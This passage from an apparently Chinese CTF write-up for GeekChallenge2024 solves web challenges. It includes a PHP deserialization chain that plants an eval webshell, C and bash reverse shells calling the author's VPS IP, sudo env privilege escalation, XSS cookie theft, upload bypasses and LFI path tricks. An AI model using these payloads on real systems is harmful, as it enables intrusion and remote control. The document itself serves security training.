class="keyword">echo</span> <span class="string">&quot;居然没坠机&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hansome-&gt;lover))&#123;</span><br><span class="line">                    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;execurise);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你也想被肘吗&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Starven</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$friend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;试试所想的呗，说不定成功了&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable language_">$this</span>-&gt;girl-&gt;abc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span>=<span class="variable language_">$this</span>-&gt;friend;</span><br><span class="line">        <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYC</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$forever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;forever-&gt;<span class="title function_ invoke__">nononon</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Syclover</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;Syclover&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$Syclover</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Syclover</span>));</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;怎么不给我呢，是不喜欢吗？&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>throw new Exception是明显的GC回收标志。除了这个就是锻炼serialize基本功的时间了<br><a href="https://blog.csdn.net/Jayjay___/article/details/130647484">https://blog.csdn.net/Jayjay___/article/details/130647484</a><br><img src="/img/WP/GeekChallenge2024/GC%E5%9B%9E%E6%94%B6.png" alt=""><br>GC回收的利用方法：<br>假设先前你要序列化a对象，改为serialize($a, null)，并把最后的i:1对象破坏，变成i:0, 这样就可以绕过throw new Exception。<br>因为PHP7.3后对private和protect不敏感，所以直接用public就可以<br>exp:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lhRaMK7</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Do</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$You</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>=<span class="string">&#x27;file_put_contents(&quot;shell.php&quot;,&quot;&lt;?=eval(\$_POST[\&#x27;cmd\&#x27;]);?&gt;&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>=<span class="string">&#x27;file_put_contents(&quot;shell.php&quot;,&quot;&lt;?=eval(\$_POST[\&#x27;cmd\&#x27;]);?&gt;&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我勒个豆，看来你有点实力，那接下来该怎么拿到flag呢？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;web);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;web=<span class="variable language_">$this</span>-&gt;love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;You-&gt;execurise=<span class="variable language_">$this</span>-&gt;Do); <span class="comment">#=&gt;Parar::__set</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parar</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$execurise</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lead</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hansome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;execurise=<span class="string">&quot;man!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;lead; <span class="comment">#=&gt;Starven::__toString</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_readable</span>(<span class="string">&quot;/flag&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;还想直接读flag，洗洗睡吧，rce去&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;execurise==<span class="string">&quot;man!&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;居然没坠机&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hansome-&gt;lover))&#123; <span class="comment">#=&gt;SYC::__isset</span></span><br><span class="line">                    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;execurise);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你也想被肘吗&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Starven</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$friend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;试试所想的呗，说不定成功了&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable language_">$this</span>-&gt;girl-&gt;abc; <span class="comment">#=&gt;Parar:: __get</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span>=<span class="variable language_">$this</span>-&gt;friend;</span><br><span class="line">        <span class="variable">$func</span>();<span class="comment"># =&gt;lhRaMk7::__invoke</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYC</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$forever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;forever-&gt;<span class="title function_ invoke__">nononon</span>();<span class="comment"># =&gt;Starven::__call</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$n</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$l1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$l2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$P1</span> = <span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$P2</span> = <span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$S1</span> = <span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$S2</span> = <span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$SYC</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"><span class="variable">$l1</span>-&gt;You = <span class="variable">$P1</span>; <span class="comment">#=&gt;Parar::__set</span></span><br><span class="line"><span class="variable">$P1</span>-&gt;lead = <span class="variable">$S1</span>; <span class="comment">#=&gt;Starven::__toString</span></span><br><span class="line"><span class="variable">$S1</span>-&gt;girl = <span class="variable">$P2</span>; <span class="comment">#=&gt;Parar:: __get</span></span><br><span class="line"><span class="variable">$P2</span>-&gt;hansome = <span class="variable">$SYC</span>; <span class="comment">#=&gt;SYC::__isset</span></span><br><span class="line"><span class="variable">$SYC</span>-&gt;forever = <span class="variable">$S2</span>; <span class="comment">#=&gt;Starven::__call</span></span><br><span class="line"><span class="variable">$S2</span>-&gt;friend = <span class="variable">$l2</span>; <span class="comment">#=&gt;lhRaMk7::__invoke</span></span><br><span class="line"><span class="variable">$Syclover</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$l1</span>,<span class="variable">$n</span>));</span><br><span class="line"><span class="variable">$Syclover</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i:1;N;&#125;&quot;</span>, <span class="string">&quot;i:0;N;&#125;&quot;</span>, <span class="variable">$Syclover</span>);</span><br><span class="line"><span class="comment">// $Syclover=str_replace(&quot;O:7&quot;, &quot;O:8&quot;, $Syclover);</span></span><br><span class="line"><span class="comment">// $Syclover=str_replace(&#x27;s:17:&#x27;, &#x27;s:16:&#x27;, $Syclover);</span></span><br><span class="line"><span class="comment">// $Syclover = rtrim($Syclover, &#x27;&#125;&#x27;);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Syclover</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$Syclover</span>);</span><br><span class="line"><span class="comment">// $Syclover=$_GET[&#x27;Syclover&#x27;];</span></span><br><span class="line"><span class="comment">// if (isset($Syclover)) &#123;</span></span><br><span class="line"><span class="comment">//     unserialize(base64_decode($Syclover));</span></span><br><span class="line"><span class="comment">//     throw new Exception(&quot;None&quot;);</span></span><br><span class="line"><span class="comment">// &#125;else&#123;</span></span><br><span class="line"><span class="comment">//     echo(&quot;怎么不给我呢，是不喜欢吗？&quot;);</span></span><br><span class="line"><span class="comment">// &#125; </span></span><br></pre></td></tr></table></figure><p><img src="/img/WP/GeekChallenge2024/ret%20127.png" alt=""><br>蚁剑连上shell发现ret 127，说明存在disable_functions<br>在蚁剑市场下载php_disable_functions绕过插件<br>利用其中的PHP7_UserFilter绕过<br><img src="/img/WP/GeekChallenge2024/bypass.png" alt=""><br>发现/flag需要root权限，尝试SUID提权</p><pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></pre><p><img src="/img/WP/GeekChallenge2024/find_result.png" alt=""><br>没找到有用的</p><pre><code>sudo -l</code></pre><p><img src="/img/WP/GeekChallenge2024/sudo_result.png" alt=""></p><p>env 可以直接获取root权限 <a href="https://gtfobins.github.io/#env">https://gtfobins.github.io/#env</a></p><pre><code>sudo env /bin/sh</code></pre><p>蚁剑的shell不大行，切到自己的vps上提权<br>先写个反弹shell <a href="https://www.revshells.com/">https://www.revshells.com/</a><br>exp.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> port = <span class="number">1234</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">revsockaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sockt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;       </span><br><span class="line">    revsockaddr.sin_port = htons(port);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;8.155.17.250&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connect(sockt, (<span class="keyword">struct</span> sockaddr *) &amp;revsockaddr, </span><br><span class="line">    <span class="keyword">sizeof</span>(revsockaddr));</span><br><span class="line">    dup2(sockt, <span class="number">0</span>);</span><br><span class="line">    dup2(sockt, <span class="number">1</span>);</span><br><span class="line">    dup2(sockt, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> * <span class="type">const</span> argv[] = &#123;<span class="string">&quot;bash&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execvp(<span class="string">&quot;bash&quot;</span>, argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gcc exp.c -o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure><p>拿到flag<br><img src="/img/WP/GeekChallenge2024/root%E6%8F%90%E6%9D%83.png" alt=""></p><h2 id="Can-you-Pass-Me">Can_you_Pass_Me</h2><p>我又来推销fenjing了:<a href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a><br>fenjing分析确实有ssti漏洞，但是好像不能直接出的样子<br>那就反弹shell</p><pre><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/8.155.17.250/1234 0&gt;&amp;1&quot;</code></pre><p><img src="/img/WP/GeekChallenge2024/fenjing.png" alt=""><br><img src="/img/WP/GeekChallenge2024/ssti.png" alt=""></p><h2 id="Problem-On-My-Web">Problem_On_My_Web</h2><p>一看是经典留言榜，试一试XSS漏洞</p><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><img src="/img/WP/GeekChallenge2024/xss.png" alt=""><br>确实有漏洞，但是document.cookie不能直接读<br>根据manager路由的提示，考虑通过manager路由带出cookie<br>先写个</p><pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><p>到留言榜，然后在/manager传参url=<a href="http://127.0.0.1/">http://127.0.0.1/</a> 带出flag<br><img src="/img/WP/GeekChallenge2024/xss_2.png" alt=""></p><h2 id="ez-http">ez_http</h2><p>burp传参如下：<br><img src="/img/WP/GeekChallenge2024/http1.png" alt=""><br><a href="https://jwt.io/">https://jwt.io/</a> 在这上面把hasFlag的false改为true，key为Starven_secret_key<br><img src="/img/WP/GeekChallenge2024/http2.png" alt=""><br>cookie传参改过的jwt回去拿到flag<br><img src="/img/WP/GeekChallenge2024/http3.png" alt=""></p><h2 id="baby-upload">baby_upload</h2><p>能传.htaccess进去？</p><pre><code>AddType application/x-httpd-php .jpg</code></pre><p><img src="/img/WP/GeekChallenge2024/upload1.png" alt=""><br>不能传.htaccess，但还有个文件叫.user.ini</p><pre><code>auto_prepend_file=a.jpg</code></pre><p>把a.jpg写上我们的webshell就行了。<br>这也不行？？？<br>结果发现a.jpg.php没被过滤。。。<br>（并不）轻松RCE，flag也不用提权读取<br><img src="/img/WP/GeekChallenge2024/upload2.png" alt=""></p><h2 id="ez-include">ez_include</h2><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;starven_secret.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;还想非预期?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看我的PHP特性集合哦(<a href="https://blog.hatchet.top/posts/44659fec">https://blog.hatchet.top/posts/44659fec</a>)<br>轮流循环绕过</p><pre><code>?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php?file=php://filter/convert.base64-encode/resource=/nice/../../proc/self/cwd/starven_secret.php</code></pre><p>给了/levelllll2.php<br>levelllll2.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>];</span><br><span class="line">    <span class="variable">$hint</span> = <span class="string">&quot;register_argc_argv = On&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hint都给的这么明显了还不会做?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], -<span class="number">4</span>) === <span class="string">&#x27;.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a><br>博客中的 pearcmd.php的巧妙利用 可以用于解决这题。<br>仿照博客的poc构造出payload<br><img src="/img/WP/GeekChallenge2024/include1.png" alt=""><br><img src="/img/WP/GeekChallenge2024/include2.png" alt=""></p><h2 id="PHP不比Java差">PHP不比Java差</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;secret.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Sink</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Is there any file?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Geek</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$change</span>=<span class="variable">$_GET</span>[<span class="string">&quot;change&quot;</span>];</span><br><span class="line">        <span class="variable">$FUNC</span>=<span class="variable">$change</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$FUNC</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Syclover</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Where</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$IS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Girlfriend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$eee</span>=<span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Where</span>(<span class="variable">$this</span>-&gt;IS);</span><br><span class="line">        <span class="variable">$fff</span>=<span class="variable language_">$this</span>-&gt;Starven;</span><br><span class="line">        <span class="variable">$eee</span>-&gt;<span class="variable">$fff</span>(<span class="variable language_">$this</span>-&gt;Girlfriend);</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>又是php反序列化？<br>反转了，我就喜欢做<br><a href="https://blog.csdn.net/qq_35533398/article/details/108492823">https://blog.csdn.net/qq_35533398/article/details/108492823</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">title</span>(<span class="params"><span class="variable">$title</span>, <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s. %s\r\n&quot;</span>, <span class="variable">$title</span>, <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$function</span> = <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$function</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="keyword">array</span>(<span class="string">&#x27;Dr&#x27;</span>, <span class="string">&#x27;Phil&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里面提到ReflectionFunction里的invokeArgs可以用于执行函数。<br>在本地测试下发现也可以执行系统函数system，且没有被题目过滤。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$function</span> = <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">    <span class="variable">$function</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="string">&quot;whoami&quot;</span>);</span><br></pre></td></tr></table></figure><p>__unserialize()方法在PHP版本大于7.4才被引入。重点方法在于$change该取什么值。<br>问gpt问出来了reset和array_pop，分别取数组的首和尾。<br>让Sink()被调用，就会引用__toString()方法。然后链子就呼之欲出了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Sink</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Is there any file?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Geek</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    